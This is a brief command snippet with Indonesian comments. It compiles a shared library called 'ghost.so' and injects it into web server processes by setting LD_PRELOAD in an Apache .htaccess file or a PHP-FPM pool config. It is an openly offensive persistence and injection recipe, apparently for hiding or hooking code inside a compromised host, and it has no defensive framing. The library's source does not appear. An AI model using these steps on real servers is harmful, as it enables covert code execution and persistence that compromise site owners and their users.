# Compile
gcc -shared -fPIC -nostartfiles -o ghost.so ghost.c -ldl

# Inject via Apache/PHP — tambah ke environment
# Di .htaccess atau PHP-FPM pool config:
SetEnv LD_PRELOAD /path/to/ghost.so

# Atau kalau punya akses ke php-fpm pool config:
env[LD_PRELOAD] = /var/www/ghost.so
